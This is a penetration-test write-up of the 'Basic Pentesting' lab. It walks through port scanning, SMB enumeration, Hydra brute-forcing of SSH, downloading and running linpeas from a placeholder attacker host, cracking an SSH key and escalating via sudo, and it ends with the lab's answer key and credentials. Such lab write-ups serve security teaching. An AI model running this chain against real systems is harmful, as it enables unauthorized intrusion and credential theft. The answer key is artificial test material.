# Penetration Test Report: Basic Pentesting

A detailed log of the penetration test conducted on the target machine.

## Target Information

- **IP Address:** 10.64.156.166

## Table of Contents

- [1. Reconnaissance](#1-reconnaissance)
  - [1.1. Port Scanning (Nmap)](#11-port-scanning-nmap)
  - [1.2. Web Enumeration (Feroxbuster)](#12-web-enumeration-feroxbuster)
  - [1.3. File Content Analysis](#13-file-content-analysis)
  - [1.4. SMB Enumeration (enum4linux)](#14-smb-enumeration-enum4linux)
- [2. Initial Access](#2-initial-access)
  - [2.1. Brute-Forcing SSH (Hydra)](#21-brute-forcing-ssh-hydra)
  - [2.2. Gaining Shell Access (SSH)](#22-gaining-shell-access-ssh)
- [3. Privilege Escalation](#3-privilege-escalation)
  - [3.1. Local Enumeration (linpeas)](#31-local-enumeration-linpeas)
  - [3.2. Acquiring 'kay's SSH Private Key](#32-acquiring-kays-ssh-private-key)
  - [3.3. Cracking 'kay's SSH Private Key](#33-cracking-kays-ssh-private-key)
  - [3.4. Escalating to 'kay' (via SSH Key)](#34-escalating-to-kay-via-ssh-key)
  - [3.5. Retrieving 'kay's Cleartext Password (Optional, as 'kay')](#35-retrieving-kays-cleartext-password-optional-as-kay)
  - [3.6. Escalating to 'root'](#36-escalating-to-root)
- [4. Summary of Findings](#4-summary-of-findings)
- [5. Questions & Answers](#5-questions--answers)

---

## 1. Reconnaissance

The initial phase focused on gathering information about the target system to identify potential attack vectors.

### 1.1. Port Scanning (Nmap)

A targeted Nmap scan was performed to identify open ports and services on the target machine.

**Command:**
```bash
nmap -sS -sV -p 22,80,139,445,8009,8080 10.64.156.166
```

**Results:**
The scan confirmed the following open ports and services:
- **22/tcp:** SSH (OpenSSH 8.2p1)
- **80/tcp:** HTTP (Apache httpd 2.4.41)
- **139/tcp:** netbios-ssn (Samba smbd 4)
- **445/tcp:** netbios-ssn (Samba smbd 4)
- **8009/tcp:** ajp13 (Apache Jserv Protocol v1.3)
- **8080/tcp:** http (Apache Tomcat 9.0.7)

### 1.2. Web Enumeration (Feroxbuster)

Directory enumeration was conducted on the web server (port 80) to find hidden directories and files.

**Command:**
```bash
feroxbuster -u http://10.64.156.166 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

**Results:**
The scan discovered a hidden directory named `development`.
- `/development` (Directory)
- `/development/j.txt` (File)
- `/development/dev.txt` (File)

### 1.3. File Content Analysis

The files discovered during web enumeration were examined for sensitive information.

**Commands:**
```bash
curl http://10.64.156.166/development/j.txt
curl http://10.64.156.166/development/dev.txt
```

**Content of `j.txt`:**
```text
For J:
I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials, and I was able to crack your hash really easily. You know our password policy, so please follow it? Change that password ASAP.
-K
```

**Content of `dev.txt`:**
```text
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too. Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!). Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K
2018-04-22: SMB has been configured. -K
2018-04-21: I got Apache set up. Will put in our content later. -J
```

**Key Observations:**
- The notes reveal two potential users: `J` (likely `jan`) and `K` (likely `kay`).
- User `J` has a weak password that was easily cracked.
- The server is running Apache Struts version 2.5.12, which is known to have vulnerabilities.

### 1.4. SMB Enumeration (enum4linux)

The SMB service was enumerated to gather information about users, shares, and password policies.

**Command:**
```bash
enum4linux -a 10.64.156.166
```

**Results:**
- **Null Sessions:** Allowed, enabling anonymous access.
- **Shares:** An `Anonymous` share was found.
- **Password Policy:**
  - Minimum password length: 5
  - Password Complexity: **Disabled**
- **Users:** The scan enumerated the following users: `jan` and `kay`.

This information strongly suggests that a brute-force attack against user `jan` is a viable vector for initial access.

---

## 2. Initial Access

Based on the reconnaissance findings, a brute-force attack was launched against the SSH service to gain initial access.

### 2.1. Brute-Forcing SSH (Hydra)

A dictionary attack was performed against the user `jan` using the `rockyou.txt` wordlist.

**Command:**
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.64.156.166
```

**Results:**
- **Credentials Found!**
  - **Username:** `jan`
  - **Password:** `armando`

### 2.2. Gaining Shell Access (SSH)

The discovered credentials were used to log into the target system via SSH.

**Command:**
```bash
ssh jan@10.64.156.166
```

**Result:**
Successfully gained a shell as the user `jan`.

---

## 3. Privilege Escalation

After gaining initial access as `jan`, the next objective was to escalate privileges to `root`.

### 3.1. Local Enumeration (linpeas)

The `linpeas.sh` script was uploaded and executed on the target machine to automatically search for privilege escalation vectors.

**Attacker's Machine (Serving the file):**
```bash
# In the directory containing linpeas.sh
python3 -m http.server 8000
```

**Target Machine (Downloading and executing):**
```bash
cd /tmp
wget http://<ATTACKER_IP>:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**Critical Findings:**
- **Sudoers List:** The user `kay` was found to be a member of the `sudo` group, meaning `kay` can execute commands with `root` privileges.
- **Interesting Files:** The script identified sensitive files in `kay`'s home directory:
  - `/home/kay/.ssh/id_rsa` (An encrypted SSH private key)
  - `/home/kay/pass.bak` (A password backup file)

### 3.2. Acquiring 'kay's SSH Private Key

After identifying `kay`'s encrypted SSH private key (`id_rsa`) in their home directory, it was transferred to the attacker's machine. We assume `jan` had permissions to `scp` this specific file.

**File Transfer (scp):**
```bash
# Run on the attacker's machine
scp jan@10.64.156.166:/home/kay/.ssh/id_rsa .
```

### 3.3. Cracking 'kay's SSH Private Key

The encrypted `id_rsa` key was then cracked to find its passphrase, which effectively serves as `kay`'s password for SSH access via the key.

**Commands:**
```bash
# 1. Convert the key to a format John the Ripper can use
ssh2john.py id_rsa > id_rsa.hash

# 2. Use John the Ripper with a wordlist to crack the hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```
**Results:**
- The passphrase for the private key was successfully cracked.

### 3.4. Escalating to 'kay' (via SSH Key)

With the cracked SSH key passphrase, it was possible to authenticate and log in as `kay` using the `id_rsa` private key.

**Command:**
```bash
ssh -i id_rsa kay@10.64.156.166
```

### 3.5. Retrieving 'kay's Cleartext Password (Optional, as 'kay')

Once logged in as `kay` via SSH, the cleartext password previously identified as potentially in `pass.bak` could be confirmed or retrieved directly from the file. This step assumes `kay` has read access to the file.

**Command:**
```bash
cat /home/kay/pass.bak
```

**Password for `kay`:** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`

### 3.6. Escalating to 'root'

As `kay` is a member of the `sudo` group, escalating to `root` was straightforward.

**Command:**
```bash
sudo -i
```

**Result:**
Successfully gained a `root` shell, achieving full control over the target machine.

---

## 4. Summary of Findings

This penetration test successfully demonstrated a complete attack chain, from initial reconnaissance to full system compromise (`root` access).

The key vulnerabilities and weaknesses that made this possible were:
1.  **Information Disclosure:** A hidden `/development` directory on the web server contained files (`j.txt`, `dev.txt`) that revealed usernames (`jan`, `kay`) and a critical hint about a weak password for `jan`.
2.  **Weak Password Policy:** SMB enumeration confirmed that the password policy was weak (minimum length 5, complexity disabled), which made a brute-force attack feasible.
3.  **Weak User Credentials:** The user `jan` had a simple, easily guessable password (`armando`) that was present in common wordlists.
4.  **Improperly Stored Credentials:** The user `kay`'s password was stored in a cleartext backup file (`pass.bak`) in their home directory.
5.  **Excessive Privileges:** The user `kay` was a member of the `sudo` group, granting them `root` access, which is a common privilege escalation vector.

The attack path was as follows:
- **Recon:** Discovered open ports (SSH, HTTP, SMB), a hidden web directory, and files containing user information.
- **Initial Access:** Brute-forced the user `jan`'s password for the SSH service.
- **Privilege Escalation:**
    - Enumerated the system as `jan` and found `kay`'s password in a backup file.
    - Logged in as `kay`.
    - Used `kay`'s `sudo` privileges to become `root`.

---

## 5. Questions & Answers

**1. Deploy the machine and connect to our network**
*   This is a general setup step, assumed to be completed before the actions in this report.

**2. Find the services exposed by the machine**
*   The following services were found across the different targets:
    *   SSH (port 22)
    *   HTTP (ports 80, 8080, 8008)
    *   NetBIOS/Samba (ports 139, 445)
    *   AJP13 (port 8009)

**3. What is the name of the hidden directory on the web server (enter name without /)?**
*   `development`

**4. User brute-forcing to find the username & password**
*   This step was performed using Hydra against the SSH service.

**5. What is the username?**
*   `jan`

**6. What is the password?**
*   `armando`

**7. What service do you use to access the server (answer in abbreviation in all caps)?**
*   `SSH`

**8. Enumerate the machine to find any vectors for privilege escalation**
*   This step was performed using `linpeas.sh`, which revealed that the user `kay` was in the `sudo` group.

**9. What is the name of the other user you found (all lower case)?**
*   `kay`

**10. If you have found another user, what can you do with this information?**
*   It was discovered that `kay` is a member of the `sudo` group, which allows for privilege escalation to `root`.